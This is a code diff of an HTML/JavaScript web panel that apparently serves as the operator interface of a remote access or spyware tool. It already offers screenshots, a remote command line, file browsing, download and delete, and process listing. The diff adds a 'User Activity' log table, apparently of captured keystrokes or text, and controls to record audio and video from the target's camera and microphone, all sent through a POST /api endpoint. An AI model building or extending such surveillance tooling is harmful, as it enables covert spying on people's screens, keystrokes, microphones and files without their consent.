@@ -81,6 +81,16 @@
             background-color: #cc0000;
         }
 
+        .blocked {
+            background-color: darkred;
+            cursor: not-allowed;
+        }
+
+        .blocked:hover {
+            background-color: darkred;
+            transform: none; /* Відключаємо масштабування */
+        }
+
         /* Screenshot container */
         .screenshot-container {
             margin-top: 20px;
@@ -218,6 +228,20 @@
     flex: 1.5; /* Medium width for created date */
     text-align: left;
 }
+
+table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 8px; text-align: left; cursor: pointer; }
+        th { background-color: crimson; }
+		        td:nth-child(2) { /* Застосовується до стовпця Текст */
+            max-width: 300px; /* Встановлення максимальної ширини для стовпця Текст */
+            word-break: break-word; /* Розрив слів при досягненні межі */
+            overflow-wrap: break-word; /* Перенесення тексту */
+        }
+		        /* Мінімальна ширина для інших стовпців */
+        th:not(:nth-child(2)), td:not(:nth-child(2)) {
+            white-space: nowrap; /* Запобігання переносу тексту */
+            width: 3%; /* Мінімальна ширина, щоб не займати зайвий простір */
+        }
     </style>
 </head>
 <body>
@@ -237,12 +261,12 @@
             <button onclick="openTab('screenshot', this)">Make Screenshot</button>
             <button onclick="openTab('processExplorer', this)">Process Explorer</button>
             <button onclick="openTab('cmd', this)">Command line</button>
-            <button onclick="openTab('stop', this)">Stop</button>
-            <button onclick="openTab('info', this)">System Info</button>
-            <button onclick="openTab('process', this)">Process Enumeration</button>
+            <button onclick="openTab('user_activity', this)">User Activity</button>
+            <button onclick="openTab('camera', this)">Camera</button>
+            <!-- <button onclick="openTab('process', this)">Process Enumeration</button>
             <button onclick="openTab('filesystem', this)">Filesystem Discovery</button>
             <button onclick="openTab('clipboard', this)">Clipboard Data</button>
-            <button onclick="openTab('delete', this)">Delete File</button>
+            <button onclick="openTab('delete', this)">Delete File</button> -->
         </div>
 
         <div class="main-panel">
@@ -282,13 +306,26 @@
                 </div>
             </div>
             
-            <div id="stop" class="tab-content">
-                <h2>Stop</h2>
-                <p>This tab is for stopping processes.</p>
+            <div id="user_activity" class="tab-content">
+                <h2>User logs</h2>
+                <table id="logsTable">
+                    <thead>
+                        <tr>
+                            <th data-sort="ppath">Program</th>
+                            <th>Text</th>
+                            <th data-sort="time">Time</th>
+                            <th data-sort="type">Type</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logsBody"></tbody>
+                </table>
             </div>
-            <div id="info" class="tab-content">
-                <h2>System Info</h2>
-                <p>This tab displays system information.</p>
+            <div id="camera" class="tab-content">
+                <h2>Camera</h2>
+                <button id = "start_record_audio" class="screenshot-button" onclick="startaudio()">Start record audio</button>
+                <button id = "stop_record_audio" class="screenshot-button" onclick="stopaudio()">Stop record audio</button>
+                <button id = "start_record_video" class="screenshot-button" onclick="startvideo()">Start record video</button>
+                <button id = "start_record_video" class="screenshot-button" onclick="stopvideo()">Stop record video</button>
             </div>
             <div id="process" class="tab-content">
                 <h2>Process Enumeration</h2>
@@ -339,29 +376,32 @@
                 case 'sysinfo':
                     if (sysinfo) {
                         fetchSystemInfo();
-                        sysinfo = 0;                     
                     }
                     break;
                 case 'fileExplorer':
                     if (f_explorer) {
                         fetchFolderContents(currentPath);
-                        f_explorer = 0;
                     }
                     break;
                 case 'screenshot':
                     if (screensh) {
                         takeScreenshot();
-                        screensh = 0;
                     }
                     break;
                 case 'processExplorer': 
                     fetchProcessContents();
                     break;
+                case 'user_activity':
+                    display_logs();
+                    break;
+                case 'camera':
+                    check_record_status();
+                break;
             }
         }
 
         function fetchSystemInfo() {
-            fetch('/do', {
+            fetch('/api', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -372,6 +412,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.status === "OK") {
+                    sysinfo = 0;
                     if (data.systemName.toLowerCase().includes("windows")) {
                         currentPath = "c:/";
                     }
@@ -420,7 +461,7 @@
         }
 
         function takeScreenshot() {
-            fetch('/do', {
+            fetch('/api', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -430,6 +471,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.status === "OK") {
+                    screensh = 0;
                     const imgElement = document.getElementById('screenshotImage');
                     imgElement.src = data.screenshot;
                     imgElement.style.display = 'block';
@@ -482,7 +524,7 @@
                 } else if(_command.trim() === '') {
                     
                 } else {
-                    fetch('/do', {
+                    fetch('/api', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -534,7 +576,7 @@
 
         async function fetchFolderContents(dir) {
             try {
-                const response = await fetch('/do', {
+                const response = await fetch('/api', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ action: 'dir_list', dir })
@@ -550,6 +592,7 @@
             const contentDiv = document.getElementById('content');
             contentDiv.innerHTML = '';
             if (data.status === "OK") {
+                f_explorer = 0;
                 document.getElementById('path').innerText = `Current Path: ${currentPath}`;
 
                 data.dirs.forEach(dir => {
@@ -610,7 +653,7 @@
         async function downloadFile(fileName) {
             try {
 
-                fetch('/do', {
+                fetch('/api', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -637,7 +680,7 @@
         async function deleteFile(fileName) {
             if (confirm(`Delete file: ${fileName}?`)) {
                 try {
-                    await fetch('/do', {
+                    await fetch('/api', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ action: 'del_file', path: currentPath + fileName })
@@ -656,7 +699,7 @@
 
         async function fetchProcessContents() {
             try {
-                const response = await fetch('/do', {
+                const response = await fetch('/api', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ action: 'proc_info'})
@@ -697,8 +740,177 @@
             }
 
         }
+
+        let logs;
         // Initialize by loading root directory
-        //fetchFolderContents(currentPath);
+        let sortOrder = {};        //fetchFolderContents(currentPath);
+        function display_logs() {
+            fetch('/api', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({action: 'get_logs'})
+            })
+            .then(response => response.text())
+            .then(data => {
+                const logsBody = document.getElementById("logsBody");
+                logsBody.innerHTML = ""; // Очищення таблиці
+
+                const lines = data.trim().split('\n');
+                // Перетворюємо кожен рядок у JSON-об'єкт
+                logs = lines.map(line => JSON.parse(line));
+                renderLogs();
+            })
+        }
+
+        function renderLogs() {
+            const logsBody = document.getElementById("logsBody");
+            logsBody.innerHTML = ""; // Очищення таблиці
+
+            logs.forEach(log => {
+                const row = document.createElement("tr");
+
+                ["ppath", "text", "time", "type"].forEach(field => {
+                    const cell = document.createElement("td");
+                    cell.textContent = log[field];
+                    row.appendChild(cell);
+                });
+                logsBody.appendChild(row);
+            });
+        }
+
+        function sortLogs(column) {
+            // Перевірка порядку сортування: зростаючий чи спадний
+            sortOrder[column] = sortOrder[column] === 'asc' ? 'desc' : 'asc';
+            const direction = sortOrder[column] === 'asc' ? 1 : -1;
+
+            logs.sort((a, b) => {
+                if (a[column] < b[column]) return -1 * direction;
+                if (a[column] > b[column]) return 1 * direction;
+                return 0;
+            });
+
+            renderLogs(); // Перерисовуємо таблицю з новим порядком
+        }
+
+        // Додаємо подію натискання на заголовки для сортування
+        document.querySelectorAll("th[data-sort]").forEach(header => {
+            header.addEventListener("click", () => {
+                const column = header.getAttribute("data-sort");
+                sortLogs(column);
+            });
+        });
+
+        function startaudio() {
+            fetch('/api', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ action: 'start_record_audio' })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === true) {
+                        alert(`Record started`);
+                    } else {
+                        alert(`Failed to start recording`);
+                    }
+                });
+                check_record_status();
+        };
+
+        function stopaudio() {
+            try {
+                fetch('/api', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ action: 'stop_record_audio'})
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'OK') {
+                        // window.location.href = data.url;
+                        const downloadLink = document.createElement('a');
+                        downloadLink.href = data.url; // URL from the response (e.g., '/artifacts/andr.crt')
+                        downloadLink.download = data.url.split('/').pop(); // Extract file name from the URL for the download
+                        document.body.appendChild(downloadLink);
+                        downloadLink.click();
+                        document.body.removeChild(downloadLink);
+                        check_record_status();
+                    }
+                });
+                } catch (error) {
+                console.error('Error downloading wav file:', error);
+            }
+        }
+
+        let rec_aud_status;
+        function check_record_status() {
+            try {
+                fetch('/api', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ action: 'check_record_status'})
+                })
+                .then(response => response.json())
+                .then(data => {
+                    rec_aud_status = data.status;
+                    let button = document.getElementById("stop_record_audio");
+                    let button2 = document.getElementById("start_record_audio");
+
+                    if (data.status) {
+                        button.disabled = false;
+                        button.classList.remove("blocked");
+                        button2.disabled = true;
+                        button2.classList.add("blocked");  
+                    } else {
+                        button2.disabled = false;
+                        button2.classList.remove("blocked");
+                        button.disabled = true;
+                        button.classList.add("blocked");                        
+                    }
+
+                });
+                } catch (error) {
+                console.error('Error downloading wav file:', error);
+            }
+        }
     </script>
 </body>
 </html>
+
+
+<!-- fetch('/api', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ action: 'take_screenshot' })
+})
+.then(response => response.json())
+.then(data => {
+    if (data.status === "OK") {
+        const imgElement = document.getElementById('screenshotImage');
+        imgElement.src = data.screenshot;
+        imgElement.style.display = 'block';
+
+        const errorElement = document.getElementById("screenshotError");
+        errorElement.style.display = 'none';
+    } else {
+        console.error('Error:', data.message);
+        const errorElement = document.getElementById("screenshotError");
+        errorElement.innerText = data.message;
+        errorElement.style.display = 'block';
+
+        const imgElement = document.getElementById('screenshotImage');
+        imgElement.style.display = 'none';
+    }
+})
+.catch(error => {
+    console.error('Error taking screenshot:', error);
+});
+} -->
